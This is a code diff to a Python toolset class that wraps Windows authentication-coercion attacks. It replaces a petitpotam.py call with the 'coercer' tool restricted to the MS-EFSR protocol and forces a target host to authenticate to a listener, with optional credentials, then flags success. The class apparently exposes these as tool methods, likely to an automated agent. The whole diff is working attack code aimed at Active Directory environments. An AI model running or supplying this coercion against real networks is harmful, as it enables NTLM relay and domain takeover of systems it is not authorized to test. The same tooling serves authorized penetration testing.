@@ -62,7 +62,18 @@ class CoercionTools(Toolset):
             >>> petitpotam("192.168.56.10", "192.168.56.100")  # unauthenticated
             >>> petitpotam("192.168.56.10", "192.168.56.100", "user", "pass", "domain.local")
         """
-        cmd = ["petitpotam.py", listener, target]
+        # Use coercer with MS-EFSR filter (same as PetitPotam) since petitpotam.py
+        # may not be installed. Coercer is more reliable and widely available.
+        cmd = [
+            "coercer",
+            "coerce",
+            "-t",
+            target,
+            "-l",
+            listener,
+            "--filter-protocol-name",
+            "MS-EFSR",  # This is the PetitPotam protocol
+        ]
 
         if username and password:
             cmd.extend(["-u", username, "-p", password])
@@ -70,12 +81,12 @@ class CoercionTools(Toolset):
                 cmd.extend(["-d", domain])
 
         try:
-            logger.info(f"[*] Running PetitPotam against {target}")
+            logger.info(f"[*] Running PetitPotam (via coercer MS-EFSR) against {target}")
             stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
 
             result = stdout + "\n" + (stderr or "")
 
-            if "attack worked" in result.lower() or "success" in result.lower():
+            if "worked" in result.lower() or "success" in result.lower():
                 logger.info("[+] PetitPotam coercion successful!")
                 result = (
                     "🚨 PETITPOTAM COERCION SUCCESSFUL!\n"
@@ -86,7 +97,7 @@ class CoercionTools(Toolset):
             return result
 
         except Exception as e:
-            return f"PetitPotam failed: {e}"
+            return f"PetitPotam (MS-EFSR coercion) failed: {e}"
 
     @dn.tool_method
     def coercer(
